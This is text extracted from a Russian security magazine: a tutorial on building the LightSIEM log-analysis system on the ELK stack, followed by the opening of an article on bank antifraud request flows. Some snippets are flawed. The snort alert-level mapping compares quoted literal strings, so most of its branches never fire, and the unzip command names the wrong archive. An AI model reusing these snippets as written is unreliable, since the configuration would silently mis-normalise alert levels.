под названием LightSIEM.


Ре зино вый поиск
Центром этого набора является Elasticsearch. Это движок для индексации
и поиска по документам, построенный на основе биб лиотеки Apache Lucene.
Разработчиками он позиционируется как возможность создать свой кор‐
поративный Google. Он часто используется как БД для хранения разнородной
информации  и  последующего  поиска  по  ней.  Elasticsearch  позволяет
в режиме реального времени индексировать поток входящих сообщений
и вести по ним поиск. Еще одна примечательная особенность Elasticsearch —
масштабируемость out of the box. Достаточ но просто установить несколько
серверов в одной сети, и они найдут друг друга и автоматически распределят
между собой хранение индексов. Разумеется, в обработке поискового зап‐
роса участвуют все серверы. Все манипуляции, в том числе CRUD, в Elastic‐
search выполняются с помощью REST API.


Универсальный кон вертер
Все запросы и ответы — в формате JSON, поэтому, чтобы передавать логи
в Elasticsearch, нам понадобится Logstash. Его основная функция — конверта‐
ция логов из одного формата в другой. В нашем случае из обычного файла
или syslog‐сообщения мы будем получать JSON‐документ, который будет
отправляться прямиком на индекса цию в Elasticsearch. Logstash очень гибок
в настройках бла годаря огромному количеству пла гинов. Один из самых
полезных — это grok. Его основная задача состоит в том, чтобы проверить,
соответствует ли полученная на вход строка или строки одно му из заданных
паттернов. Паттерны grok — это регуляр ные выражения на стероидах.
Во‐первых, они позволя ют соб рать довольно сложные выражения из элемен‐
тарных блоков. Во‐вторых, они позволяют разбить все вхо дящие сообщения
на множество полей, каждое из которых будет иметь свое название и смысл.
Примерно такой JSON‐документ получается на выходе:


{
    "@timestamp" => 2017‐03‐30T19:25:54.264Z,
      "@version" => "1",
        "Classification" => {
            "Ident" => "106023",
             "Text" => "%ASA‐4‐106023"
        },
        "CreateTime" => 2017‐03‐30T20:37:22.000Z,
        "Level" => {
            "Origin" => "4",
            "Normalized" => 5
        },
        "Protocol" => "udp",
        "Name" => "cisco"
        "Source" => {
            "Node" => {
                "Geoip" => {
                    "ip" => "188.123.231.104",
                    "city_name" => "Moscow",
                    "country_code2" => "RU",
                    "location" => [
                        [0] 37.615,
                        [1] 55.752
                    ],
            },
            "Address" => "188.123.231.104",
               "Port" => "23256",
               "Name" => "188.123.231.104"
        },
    },
}

Как я уже упоминал, некоторые IDS пишут в свои логи намного больше
информации, чем могут отправить по протоколу syslog. То есть события
от таких систем оптимально читать непосредственно из мно гострочного
лог‐файла, куда они пишут свои сообщения. Дол гое вре мя единственным
вариантом обработки таких файлов была непосредственная установка Log‐
stash на тот же сервер, где стоит IDS. Не всех устраивал такой вариант, пос‐
кольку Logstash при обработ ке больших объемов логов может давать ощу‐
тимую нагрузку на CPU и потреблять довольно много памяти. Кроме того,
Logstash написан на JRuby и, соот ветственно, требует установки на сервер
Java, что также не для всех желательно. Специально для таких случаев была
разработана отдельная утилита Lumberjack. Позднее ее переименовали
в Logstash  forwarder, а после этого проект был полностью переписан
и получил название Filebeats. Кроме того, в семействе Beats появилось
еще несколько утилит: Packet для обработки сетевого трафика, Winlog
для отправки в Logstash нативных логов Windows EventLog и другие. Я уже
писал, что проекты, связанные с ELK, развива ются очень стремительно,
и путь от Lumberjack к Beats — тому отличный пример. Единственная задача
Beats — прочитать данные из источника, например файла с логом, и отпра‐
вить их на сервер Logstash. Эта утилита потребляет очень мало ресурсов,
проста в конфигурировании, написана на Go и, следовательно, не тре бует
установки Java. Кроме того, авторы Beats входят в команду разработчиков
ELK, а значит, проблемы совместимости протоколов, их реализаций и воз‐
можность потерять дан ные тут минимальны.


Прек расный цве ток «Кибаны»
Из ком понентов приятнее всех для пользователя Kibana. Это веб‐интерфейс,
позволяющий составлять запросы к Elasticsearch, строить различные гра‐
фики, гистограммы и всячески визу ализировать полученные поисковые
результаты. Разумеется, просмотреть найденные документы с учетом всех
извлеченных в Logstash полей тоже можно. Все диаграммы и визу ализации
в Kibana полностью интерактивны. То есть, как только на гистограмме будет
выделен временной промежуток, он автоматически добавится в фильтры,
и вся панель перестроится с учетом нового условия. Если же, например, щел‐
кнуть по столбику, который показы вает уровень сигнала тревоги, то он так же
добавится в фильтр запроса, и на всех визуализациях и поисковой выдаче мы
будем уже наблюдать только события с этим уровнем важности.





                            Kibana dashboard


Лига безопасного ин терне та поис ка
На самом деле если у тебя есть проблема и ты начинаешь использовать
для ее решения Elasticsearch, то у тебя появляет ся сразу две новые проб ‐
лемы. Первая — это шифрование трафика. Да, Elasticsearch не предоставля‐
ет никакого шиф рования ни при осуществлении запросов к его серверам,
ни при коммуникации серверов между собой. Вторая проблема заключается
в отсутствии привычной для баз данных системы ограничения доступа. Все
эти GRANT SELECT ON db2.alerts тут по дефолту отсутствуют. В Elasticsearch
любой, кто смог подключиться к порту, может выполнять любые запросы —
читать, изменять, удалять данные. Большинство настроек в Elasticsearch хра‐
нятся в служебных индексах, и их можно менять на лету с помощью точно
таких же REST‐запросов. В общем, любой злоумышленник, воору женный Tel‐
net‐клиентом, может по полной нарушать конфиденциальность, целостность
и доступность твоего кластера Elasticsearch. А ты в нем хранишь дан ные
о действиях как раз этого самого злоумышленника. Непорядок.
  Решать эти задачи предполагалось с помощью плагинов для Elasticsearch.
Они появились далеко не сразу, и не все дожили до настоящего времени.
Разработка многих была оста новлена, так как появился плагин непосредс‐
твенно от разработчиков Elasticsearch — Shield. Хоть он и тре бовал покупки
лицензии, видимо, многие соч ли это более простым решением, чем раз‐
работка своего плагина безопасности. Другие плагины попросту не успевали
за стремительным развитием Elasticsearch. Ведь каждая новая версия прив‐
носила изменения в API. На текущий момент есть два основных плагина,
которые обеспечивают шифрование и разделение прав. Shield, как я писал
выше, — это коммерческая разработка команды Elasticsearch. Другой —
Search Guard — является сторонней разработкой германской компании ﬂor‐
agunn. Его исходный код опубликован на GitHub.com. Разработ чики оказыва‐
ют ком мерческую техническую поддержку. Search Guard пред ставляет собой
набор из двух пла гинов — Search Guard SSL и Search Guard. Search Guard SSL
обеспечивает шифрование данных между сер верами и клиентами. Search
Guard служит опциональным допол нением к Search Guard SSL, которое обес‐
печивает аутентификацию и разграничение прав доступа. Права можно огра‐
ничивать как к индексам, так и к типам данных (обя зательное для каждого
документа Elasticsearch поле _type). Например, можно дать доступ к логам
систем обнаружения вторжений только офицерам безопасности. А право
просмотра логов сетевого оборудования выдать еще и сетевым администра‐
торам.


Rule them all
Сразу после того, как я в первый раз попробовал связать все компоненты
воедино, стало понятно, что повторить этот подвиг с нуля через пару
месяцев, скорее всего, будет очень тяжело. Причина тому, как всегда,
информацион ная перегрузка и плохая память. На поиски некоторых настроек
уходило ощутимое количество времени, и тратить его сно ва для устранения
той же проблемы не хотелось. Но это еще пол беды. Если хочешь, чтобы тво ‐
им решением пользовались, оно должно быть доступным. Для бесплатного
ПО главный критерий доступности — простота уста новки. В моем случае она
сильно стра дала. Самым очевидным вариантом было написать огромную
статью, которая бы показывала, как все устанав ливать и настраивать. Отяг‐
чало проблему то, что стек ELK довольно новый и мало кто разбирался в нем
хорошо. Кроме того, какие‐то изменения я вносил почти каждый день. Статья
рисковала либо оказаться неактуальной к моменту окончания, либо никогда
не быть завершенной. Я подумал, что было бы здорово вместо документации
написать скрипт, который был бы понятен любому человеку и при этом
еще устанавливал и интегрировал все компоненты вместе. Таким скриптом
стала утилита автоматизации Ansible. Она позволила писать так называемые
playbook’и, которые с виду выглядят достаточно «человекопонят но», а при
запуске программой выполняют сложную и скучную последовательность дей‐
ствий для установки и настройки всех компонентов. Помимо этого, Ansible
не требует установки на конеч ные серверы какого‐либо агентского ПО, ей
достаточно только доступа по SSH.


‐ name: Check search‐guard‐5 is installed
   command: /usr/share/elasticsearch/bin/elasticsearch‐plugin list |
grep search‐guard‐5
  register: sg_installed
‐ name: Install search‐guard‐5
  command: /usr/share/elasticsearch/bin/elasticsearch‐plugin install
‐b com.floragunn:search‐guard‐5:5.1.1‐9
  tags: configuration security
  when: sg_installed.stdout != "search‐guard‐5"


Unify them all
Помимо проблемы автоматизации, пришлось решать проблемы сопоставле‐
ния данных из различных источников информации. Во‐первых, у каждого
источника событий своя шкала уровней тревоги. В общем случае этот уро‐
вень должен показывать, насколько вероятно, что произошла или происходит
попытка вторжения. В Snort самая высокая вероятность вторжения обознача‐
ется уровнем 1, а самая низкая — уровнем 4. А в OSSEC HIDS самая большая
вероятность вторжения находит ся на 15‐м уровне сигнала тревоги, а на уров‐
не 0 — события, которые вообще не заслужива ют никакого внимания.
Во‐вторых, разные системы выдают различные наборы данных. Например,
в сигналах тревоги от Snort всегда присутствуют адрес источника и адрес
цели потенциальной атаки. В сигналах тревоги от OSSEC, напротив, таких
данных вообще может не быть или они могут присутствовать в них косвенно.
Для того чтобы все эти разнородные данные можно было хоть как‐то сопос‐
тавлять, пришлось разработать систему полей, на которые разбиваются все
входящие сообщения. За основу я взял стандарт IDMEF — Intrusion Detection
Message Exchange Format. В нем уже описана структура данных, которая пок ‐
рыла 90% всех потребностей.
  Поскольку формат даты и времени у всех также индивидуальный, эти дан ‐
ные тоже пришлось приводить к общему виду. На текущий момент все извле‐
каемые даты сохраняются в поле Alert.CreateTime. В дополнение к этому
в служебное поле @timestamp сохраняется отметка времени того, когда
событие было сохранено в Elasticsearch. Два этих поля необходимы, потому
что при передаче событий в Logstash по протоколам с гарантированной дос‐
тавкой, например Beats или TCP, при воз никновении проб лем с сетью
события могут быть буферизированы на передающих устройствах и переданы
позже. Соответственно, будет некорректно обрабатывать события на основе
поля @timestamp.
                   ← НАЧАЛО СТАТЬИВЗЛОМ
  АНАЛИЗИРУЙ ЭТО

        СТРОИМ SIEM НА ОСНОВЕ OPEN
           SOURCE КОМПОНЕНТОВ ДЛЯ
                     АНАЛИЗА ЛОГОВ





Раз ворачиваем LightSIEM
На текущий момент в LightSIEM можно направлять прак тически любые логи
по протоколам syslog или Beats. Но не для любого лога написаны паттерны
в Logstash. Самая пол ная поддержка реализована для OSSEC и Snort. Их логи
можно отправлять по протоколу syslog, можно писать их в стандартном мно‐
гострочном формате в файл, а потом отправлять с помощью Filebeat. Первый
вариант удобен тем, что достаточно просто настроить отправку логов по про ‐
токолу syslog на нужный сервер — сооб щения сразу начнут появляться
в SIEM. Как я уже писал в начале статьи, во втором варианте информатив‐
ность будет выше, но и настройка займет чуть больше времени, так как необ‐
ходимо поставить дополнительный пакет и настроить его. Под держивают ся
также логи сетевого оборудования Cisco — роутеров и межсетевых экранов.
Частично реализована поддержка логов Auditd.
   Хоть я и постарал ся максимально упростить установку LightSIEM, давай
все же разберем детально, как это сделать, что будет про исходить во время
запуска playbook’а и как будут обрабатываться поступающие логи. Еще до
того, как ты начнешь инсталлировать LightSIEM, неп лохо иметь источники
данных, которые ты будешь анализировать. Как установить сервер OSSEC, ты
можешь почитать в моей статье «За высоким забором OSSEC» в «Хакере»
№184. Может тебе пригодиться и моя статья на Хаб ре. Для начала нам
понадобится отдельный сервер под управлением Linux. Лучше всего подой‐
дет CentOS/RHEL/Oracle версии 7.0 и выше. Playbook оптимизирован именно
под эти дистрибутивы, но если ты предпочитаешь другие, то всегда можешь
разобраться с тем, что дела ет playbook, и модифицировать его под свой
любимый дистрибутив, попут но закоммитив результат работы к нам на GitHub
;). После того как ты подготовил сервер и настроил на нем сеть с выходом
в интернет, необходимо установить на него сам Ansible и unzip. Установить
Ansible проще всего из репозитория EPEL. Итого, для начала необ ходимо
выполнить две команды:


yum install epel‐release
yum install ansible unzip

Затем нужно ска чать архив с кодом и распаковать его следующими коман‐
дами:


wget https://github.com/dsvetlov/lightsiem/archive/v0.2.1.zip
unzip master.zip

Теперь все готово к тому, чтобы запустить playbook и заинсталлить все необ ‐
ходимое для LightSIEM:


ansible‐playbook lightsiem‐master/lightsiem‐install.yml

Вкратце поясню, что делает скрипт. Прежде всего инсталлируются официаль‐
ные репозитории  Elasticsearch. Затем из них уже устанавливаются все
основные компоненты — Logstash, Elasticsearch и Kibana. Далее вык ладыва‐
ются конфиги для Logstash. Они разделены на несколько отдельных файлов,
чтобы было проще ориентироваться в них. Их назначение разберем чуть поз‐
же.  Скрипт  также  уста навливает  допол нительные  паттерны  для  grok.
Это отдельные файлы с описанием регуляр ных выраже ний, которыми потом
парсятся входящие сообщения. Также скрипт открывает порты в ﬁrewalld.
Если на своей системе ты его заменил на iptables — не беда. Скрипт про‐
игнорирует эти ошибки, но порты тебе придется открыть самостоятельно.
После этого всего скрипт устанавливает Search Guard и заливает несколько
дашбордов для Kibana.
   Итак, LightSIEM ты уста новил, порты открыл. Теперь необходимо нап‐
равить в него алерты из OSSEC. Самый простой способ сделать это — впи‐
сать в главной секции конфига сервера следующие строки:


<syslog_output>
   <server>address of LightSIEM server</server>
   <port>9000</port>
   <format>default</format>
</syslog_output>

Естественно, в тегах <server>, нужно писать адрес сервера, куда ты уста‐
новил LightSIEM. Способ чуть сложнее — уста новить на сервер c OSSEC File‐
beat. Отдельно сделан конфиг для каждого источника логов, которые может
обрабатывать LightSIEM. В таких файлах прежде всего описывается input.
Это тот элемент кон фигурации Logstash, который отвечает за прием логов
по одному из протоколов. Соот ветственно, если подразуме вается доставка
логов не только простым syslog’ом, но и с помощью Beat, в файле описан
отдельный input для каждого протокола. Далее в этом файле происходит пар‐
синг с помощью фильтра grok и специфических для дан ного типа логов пат ‐
тернов. После grok документы проходят обработку, также специфичную толь‐
ко для дан ного типа логов. Например, извлекаются метки времени, приводит‐
ся к единому формату шка ла уров ня тревог.
  После этого в игру вступает файл конфигурации, который называется com‐
mon. Как и следует из его названия, он участвует в обработке абсолютно всех
логов. Его основная задача — обогащение наших событий дополнительной
информацией.


По лучаем из логов события
Все входящие сообщения, независимо от источника и про токола, обрабаты ‐
ваются  в  Logstash. Настройка  Logstash  оказалась  самой  трудоемкой
и тяжелой, но при этом самой полезной для анализа событий. Первое, что
происходит с каждым входящим событием, — это парсинг с помощью филь‐
тра grok. На этом этапе длинная строчка события превращается в набор
более коротких полей. Все поля именуются в соответствии с общей схе мой.
Таким образом, семантически сходные дан ные попадают в одно и то же поле,
даже если они пришли из разных источников. Например, Snort может
зарегистрировать попыт ку сканирования портов с определенного IP‐адреса.
OSSEC может подать сигнал тревоги о том, что с конкретного адреса был
осуществлен вход на сервер. А межсетевой экран вообще запишет все
соединения, которые устанавливались через него, в том числе и их исхо‐
дящие адреса. Во всех этих трех случаях исходящий адрес будет записан
в поле Alert.Source.Node.Address. Соот ветственно, при обнаружении
событий с высоким уровнем приоритета есть возможность парой кликов
мыши поискать все события с этого IP‐адреса. Уже после того, как вхо дящие
сообщения разбиваются на множество мелких, происходит еще несколько
преобразований. Первое, что нужно сделать, — привести уровень сигнала
тревоги к единой шкале. Я взял за основу шкалу, которая используется в OS‐
SEC, так как она уже неплохо описана и у нее есть целых 16 уровней, в отли‐
чие от того же Snort, где всего четыре уровня.


if [type] in ["snort", "snort_full", "snort_barnyard"] {
        if [Alert][Analyzer][Level][Origin] == "1" {
              mutate { add_field => [ "[Alert][Analyzer][Level][
Normalized]", "15" ] }
        } else if "[Alert][Analyzer][Level][Origin]" == "2" {
              mutate { add_field => [ "[Alert][Analyzer][Level][
Normalized]", "11" ] }
        } else if "[Alert][Analyzer][Level][Origin]" == "3" {
              mutate { add_field => [ "[Alert][Analyzer][Level][
Normalized]", "6" ] }
        } else if "[Alert][Analyzer][Level][Origin]" == "4" {
              mutate { add_field => [ "[Alert][Analyzer][Level][
Normalized]", "4" ] }
        }
}

После этого необходимо из полей, куда попали временные отметки, извлечь
и преобразовать время. Тут разнообразие вариантов того, как записываются
временные отметки, тоже иногда удивляло.
  Далее наступает черед обогащения события дан ными. Первое, что очень
облегчает анализ событий, — обратные DNS‐запросы. Ведь оперировать
DNS‐именами серверов удобнее, чем скупыми октетами IP‐адресов. Так
можно с первого взгляда понять, принад лежит ли тот или иной компьютер
к dial‐up‐пулу провайдера из Твери или является сервером из фермы vk.com.
Каждый IP‐адрес источника и назначения, если он в событии присутствует,
Logstash пытается разрешить в DNS‐имя. Если это получается, то наряду
с  полями  Alert.Source.Node.Address  и  Alert.Target.Node.Address
в событии появляются поля Alert.Source.Node.Name и Alert.Target.
Node.Name.
  Разумеется, далеко не все адреса успешно разрешаются в имена,
а искать хочется прежде всего по полю с именем. Что бы не складывалась
ситуация, в которой часть событий имеет поле с DNS‐именем, а другая часть
не имеет, Logstash в слу чае, если разрешить IP‐адрес не удалось, записывает
в поле c DNS‐именем IP‐адрес. Это позволя ет работать с полями Alert.*.
Node.Name как c универсаль ными — в которых в любом случае есть какой‐то
IP‐адрес или DNS‐имя.
  Поскольку даже при большом объеме событий необходимо их быстро раз‐
решать, в состав LightSIEM вошел DNS‐сервер dnsmasq. Что бы не увеличи‐
вать площадь поверхности атаки на сер вер и не откры вать вовне еще один
порт, Ansible устанавливает и настраивает dnsmasq слушать только адрес
loopback‐интерфейса. Так как на каждом сервере свои собственные настрой‐
ки DNS‐серверов для пересыл ки запросов, в dnsmasq было решено исполь‐
зовать серверы из /etc/resolv.conf, как наиболее универсальный метод
по умолчанию. Для уменьшения нагрузки на серверы пересылки запросов
и ускорения ответов dnsmasq настроен кешировать ответы от серверов.
Таким образом, если из Logstash придет несколько запросов для одно го
и того же адреса, он будет разрешен только в первый раз, а все последу‐
ющие ответы уже будут даны из кеша.


if ![Alert][Source][Node][Name] and [Alert][Source][Node][Address]
{
    mutate { add_field => [ "[Alert][Source][Node][Name]", "%{[
Alert][Source][Node][Address]}" ] }
    dns {
        reverse => [ "[Alert][Source][Node][Name]"]
        action => "replace"
        nameserver => "127.0.0.1"
    }
}

В дополнение к обратным DNS‐запросам осу щест вляются запросы в базу
данных GeoIP. Это позволя ет добавить в событие примерные координаты IP‐
адресов и впоследствии вывести их на карту в Kibana. Необ ходимо учитывать,
что данные координаты примерные и чаще всего берутся по адре су ком‐
пании, на которую зарегистрирован IP‐адрес. Тем не менее это одна
из самых эффектных визуализаций данных о вторжениях. Ни один голливуд ‐
ский боевик без такой карты не обходится.


geoip {
source => "[Alert][Source][Node][Address]"
     target => "[Alert][Source][Node][Geoip]"
}
"Geoip" =>
        {
            "ip" => "188.123.231.104",
            "city_name" => "Moscow",
            "country_code2" => "RU",
            "location" => [
                [0] 37.615,
                [1] 55.752
            ],
        }

Еще одна важная функция, которая лежит на Logstash, — интеграция с дру‐
гими системами. Самый простой способ — отправка  email. Например,
по письму можно заводить инцидент в большинстве систем управления инци‐
дентами. Уведомления по email еще и самый простой спо соб оперативного
оповещения всех заинтересованных лиц об инциденте. Вообще, у Logstash
тут довольно большая гибкость. Например, можно выполнять запросы к Elast‐
icsearch и обрабатывать их результаты, чтобы решить, что делать с пришед‐
шим событием. Это можно использовать в будущем для создания правил
корреляции. Также есть воз можность выполнить любую команду или скрипт.
По сути, это универсальный способ, который позволяет интегрироваться
с любыми системами. Необ ходимо отправить СМС — запуск скрипта. Нужно
добавить запись в какую‐то внешнюю базу дан ных — тоже запуск внешнего
скрипта. Тут можно даже добавить небольшую функциональность IPS. Если
Snort регистрирует попыт ки ата ки с определенного адреса, то с помощью
выполнения скрипта можно заблокировать этот адрес на межсетевом экране.
При этом есть возможность задать очень сложные фильтры. Задавать можно
любые условия относительно полей события. Например, можно указать, что
у события должен быть определенный IP‐адрес источника, определенный код
и уровень важности не менее 15.
  Из Logstash все события передаются для хранения и индексации в Elastic‐
search. Основная функция Elasticsearch — хранение поступающих дан ных и их
обработ ка для быстрого поиска. Все данные хранятся в структурах под наз‐
ванием индексы. Каждый индекс должен состоять как минимум из одного
шарда. Шард — это сущность, которая содержит часть индекса. Так же в сос‐
тав индекса могут входить реплики. Реплика — это копия шарда, которая рас‐
полагается на другом сервере и служит для повышения отказоустойчивости
и обработки поисковых запросов. Если одного сервера с Elasticsearch не хва‐
тает для обработки всей поступающей информации или для последующего
поиска по ней, можно очень легко установить дополнительные серверы. Одна
из особен ностей Elasticsearch заключается в том, что для настройки кластера
из несколь ких серверов и распределения между ними нагрузки не нужно тра‐
тить много времени. Когда серверы оказываются в одной подсети, они авто‐
матически друг друга находят. После этого они автоматически распределяют
между собой шарды и реплики. Такая особенность позволя ет легко соз‐
давать боль шие кластеры, которые обеспечива ют надежность благодаря
тому, что реплики каждого шарда распределены между разными серверами,
и масштабируемость производительности.
   Типы полей в Elasticsearch могут определяться автоматически. Кроме того,
сама схема полей может динамически расширяться по мере появления новых
записей. Это означает, что если добавить новое поле на уровне Logstash, то
изменять на стороне Elasticsearch ничего не придет ся. Все документы будут
сохранены со всеми полями, которые в них есть, а если такие поля ранее
никогда не встречались, то они будут созданы автоматически. Еще одна
полезная в некоторых случаях функция Elasticsearch — анализаторы полей.
По умолчанию все поля документов анализируют ся — примерно так же,
как это делают поисковые системы. То есть предложения разбиваются
на отдельные слова, слова приводят ся к одному регистру и так далее. В слу ‐
чае SIEM‐системы, где большинство полей пред ставляет собой фик сирован‐
ное описание событий, их цифровые коды и IP‐адреса, это будет избыточным
и только замедлит работу всей системы.
  Несмотря на то что динамически создаваемые поля и автоматически
определяемые типы данных — очень удобные функции, осо бенно на этапе
разработки, они иногда создают проблемы. Например, если поле с уровнем
сигнала тревоги, записанным в виде числа, случайно определится как тек сто‐
вое, то многие функции, которые используют ся в Kibana для постро ения гра‐
фиков, станут недоступны. Для настройки типа полей, их названия и еще мно‐
гих параметров используются специальные шаблоны. В общем слу чае шаб ‐
лон создается как документ в Elasticsearch и хра нится в нем. При этом в свой‐
ствах шаблона указывается то, для каких индексов он применяется.
  В LightSIEM Logstash создает новый индекс для данных каждый день.
Это необходимо для того, чтобы индексы не разрастались и можно было лег‐
ко удалить данные за определенный день. Упомянутый шаб лон задается
как опция для отправки данных в Elasticsearch. Таким образом Logstash про ‐
веряет, есть ли уже шаб лон в Elasticsearch, и, если его еще нет, создает.
В шаблоне, в свою очередь, задаются свойства каждого поля — его тип
и необходимость в анализе.
   Взаимодействие  пользователя  с  SIEM  происходит  с  помощью
веб‐интерфейса Kibana. Он был разработан специально для работы с Elastic‐
search. Позволяет создавать интерактивные панели с графиками (dashboard).
Каждый элемент такого графика кликабельный. При клике на него соот ветс‐
твующее значение добавляет ся в фильтр поискового запроса всей доски,
и все графики на ней перестраиваются с учетом этого фильтра. Например,
можно вывести на такую доску список из узлов, от которых зарегистрированы
события, список узлов, на которые приходили события, и уровней сигналов
тревоги. При клике на конкрет ный сервер в списке источников атак остальные
графики перестроятся, и уже можно будет судить о том, с каких серверов
на этот сервер приходили атаки и какой у них уровень сигнала. Если после
этого кликнуть на какой‐то конкрет ный уровень сигнала тревоги, он также
добавится в филь тр, и мы уже сможем уви деть, с каких серверов шли атаки
данного уровня опасности на наш сервер.
   Kibana может исполь зовать данные GeoIP, которые добавляет Logstash
для отображения на карте источников или жертв атак. Очень полезны гис‐
тограммы распределения событий во времени. Они позволяют выделить
мышкой нужный промежуток времени и также добавляют его в фильтр
для всей панели. Таким образом можно быстро выбирать, события из какого
временного  промежут ка  необ ходимо  показы вать.  Естественно,  каждое
событие можно смотреть и в крат кой фор ме, и в подробной.


ВМЕСТО ЗАКЛЮЧЕНИЯ
Итак. Ты сейчас установил себе LightSIEM (установил ведь?), а я, надеюсь,
достаточно подробно рассказал, как он функционирует. Ты вполне можешь
взять его за основу и допилить под себя. Можешь использовать как есть
и только добавлять правила. Если же ты решишь закоммитить какие‐то изме‐
нения в репозиторий, то помни, что ты этим сделал мир чуть безопаснее.
Если у тебя нет понимания, как реализовать твои идеи, то же смело пиши —
будем вместе думать и реализовывать по мере возможностей.
ВЗЛОМ

 АНТИФРОДАНТИФРОД

    РАЗБИРАЕМ ПРОЦЕССЫ РАБОТЫ
      СИСТЕМЫ БАНКОВСКОГО
           АНТИФРОДА





                                   Максим Федотенко
                                          mfedotenko@gmail.com mfe‐
                                                       dotenko.ru




В первой статье цикла мы рассмотрели архитектуру системы
антифрода и ее связку с интернет‐банком, а также пробежа‐
лись по процес су ана лиза события антифродом. В рассмат‐
риваемой нами системе существует всего четыре ответа
антифрода  для  обра батываемых  событий:  разрешить
или запретить событие, произвести дополнитель ную аутен‐
тификацию и соз дать кейс для последующего анализа ана‐
литиком. Эти ответы формируются системой антифрода
на основании оцен ки риска и правил политики, задаваемых
фрод‐аналитиком. В этом выпуске мы более подробно
поговорим о технологических процессах, зависящих от того,
какое решение принима ет антифрод. Итак…


ПРОТОКОЛ ВЗАИМОДЕЙСТВИЯ
Обмен  необходимыми  данными  меж ду  интернет‐банком  и  системой
антифрода определя ется некоторым протоколом. Для того чтобы получить
ответ от системы антифрода, интернет‐банк дол жен использовать соответс‐
твующие методы этого протокола, которые ука зывают, что же он хочет
от антифрода. В нашей системе их достаточно много, и ниже приведе ны
только наиболее распространенные из них.
 • CREATEUSER. Этот метод применяется для создания нового поль‐
   зователя  в  системе антифрода.  Заводить  поль зователя  в  системе
   антифрода необязательно, но обычно это делают, если антифрод также
   будет аутентифицировать пользователя вместо интернет‐банка или вмес‐
   те с ним.
 • UPDATEUSER. Метод обновля ет профиль пользователя, который был
   создан CREATEUSER, включая все сведения об учетных данных.
 • ANALYZE. Метод выпол няет анализ рисков для одного или нескольких
   событий, при этом проводя аутентификацию пользователя. Это основной
   метод, с которого обычно начинается взаимодействие интернет‐банка
   и антифрода в процессе анализа события.
 • AUTHENTICATE. Метод проверяет пользователя с помощью учетных дан‐
   ных.
 • CHALLENGE. Инициация дополнительной аутентификации пользователя.
 • QUERYAUTHSTATUS. Метод возвращает состояние аутентификации
   при асинхронном процессе дополнительной аутен тификации пользовате‐
   ля.
 • NOTIFY. Этот метод позволяет интернет‐бан ку оповестить антифрод
  об интересующих событиях, которые он может добавить в свои про фили
   для использования в модели фрода.

Как видишь, все общение между интернет‐банком и системой антифрода
сводится к нескольким командам:
 • заведи или измени информацию о пользователях, например кодовое сло‐
   во или телефон;
 • проанализируй событие и ска жи вердикт;
 • аутентифицируй пользователя или произведи дополнительную аутен‐
   тификацию;
 • сообщи, каков статус аутентифика ции, если она проводится в асинхрон‐
  ном режиме;
 • вот информа ция, которая, возможно, будет интересна, но ответ мне
   не нужен.

Теперь посмотрим, как этот протокол общения проецируется на основные
процессы работы интернет‐банка и системы антифрода в случае различных
рекомендованных действий, а также процесс заведения пользователя.


РАЗРЕШЕНИЕ ОПЕРАЦИИ (ALLOW)
Обычно большинство операций в интернет‐банке проходят без каких‐либо
дополнительных действий с твоей стороны. Например, оплачивая услу ги
интернет‐провайдера за текущий месяц, ты переводишь 500 руб лей на счет
провайдера. Этот пла теж и есть для системы антифрода событие, вердикт
по которому обычно положительный (ALLOW). Процесс обработ ки такой тран ‐
закции показан на рис. 1.





     Рис. 1. Процесс обработки события в случае разрешения операции

Пройдемся по этой схеме. Ты нажимаешь на кнопку денежного перевода (1),
интернет‐банк отображает тебе форму, в которой просит заполнить рек‐
визиты операции, например название провайдера, номер лицевого счета
и сум му (2). Ты их запол няешь и подтверждаешь отправку. При этом система
антифрода при помощи  JavaScript‐скриптов собирает данные о тво ем
устройстве (об этом мы поговорим в следующих выпусках) (3), которые вмес‐
те с платежными данными отправляют ся в интернет‐банк для собственно осу‐
ществления операции (4). После получения данных по операции пользовате‐
ля интернет‐банк просит антифрод их проана лизировать и дать свое зак ‐
лючение. Для этого интернет‐банк фор мирует запрос с методом ANALYZE
к Adaptive Authentication. В этом запросе передаются данные о пользователе,
об устройстве пользователя, идентификатор канала и собственно данные
платежа — кому и сколько (5). Adaptive Authentication ищет устройство поль‐
зователя, рассчитывает уровень риска транзакции и применяет политики (6).
В результате он вырабатывает рекомендованное действие, которое переда‐
ется в ответе син хронного метода ANALYZE. В данном случае это разрешение
(ALLOW). При этом ответ содержит идентификаторы сессии, пользователя,
устройства, а также данные анализа — уровень риска, рекомендованное дей‐
ствие  (ALLOW)  и  название  сра ботавшего  правила  политики   (7).
Интернет‐банк может установить идентификатор сессии в куку и передать его
в клиентский браузер для идентификации браузера при сле дующем запросе
(процесс не обязателен) (8). После этого интернет‐банк проводит операцию,
давая команду расчетной системе зачислить деньги на счет провайдера (9).


РАССМОТРЕНИЕ ОПЕРАЦИИ (REVIEW)
Однако не всег да транзакции от твоего имени так легко могут быть выпол‐
нены банком. Некоторые из них могут оказаться подозрительны. Например,
если ты пытаешься перевести  крупную сумму себе на  QIWI‐кошелек,
это похоже на вывод денег с твоего счета. В результате анализа антифрод
может дать заключение, что провести такую операцию возможно, но при этом
создаст кейс для дальнейшего анализа этой операции фрод‐аналитиком.
С точки зрения протокола рассмат риваемой системы антифрода такой про‐
цесс выглядит так, как показа но на рис. 2.





   Рис. 2. Процесс обработ ки события при передаче его на рассмот рение

Как и в предыдущем случае, вначале проходят типовые шаги (1–4). Далее
интернет‐банк отсылает запрос с методом ANALYZE на Adaptive Authentication
(5), который обра баты вает транзакцию (6). В результате обработки Adaptive
Authentication вырабатывает рекомендованное действие, которое передается
в ответе метода ANALYZE (7). В данном случае — отправить на рассмотрение
(REVIEW). При этом ответ содержит идентифика торы сессии, пользователя,
устройства, а также информацию анализа — уровень риска, рекомендован ‐
ное действие (в нашем случае REVIEW) и название сработавшего правила
политики. Интернет‐банк, так же как в предыдущем случае, может установить
идентификатор устройства в куку и передать его в браузер клиента для иден‐
тификации экземпля ра при следующем запросе  (8). Основное отличие
от процесса ALLOW состоит в том, что интернет‐банк хоть и проводит тран‐
закцию (9), но при этом в системе антифрода создается кейс в компоненте
Case Management (10). В дальнейшем фрод‐аналитик обрабаты вает данный
кейс, это ведет, например, к тому, что банк тебе перезвонит и задаст уточ ‐
няющие вопросы об этой транзакции (11). При этом нужно понимать, что
в  данном  процессе  день ги  на  QIWI‐кошелек  уже  будут  переве дены,
а фрод‐аналитик только лишь закроет кейс в Case Management (12), который
передаст в Adaptive Authentication резолюцию по событию для корректировки
модели фрода. А если на твоем компьютере или телефоне был вирус и он
перевел деньги, нужно будет бежать в сторону QIWI и бло киро вать кошелек,
пока деньги с него не обналичили…
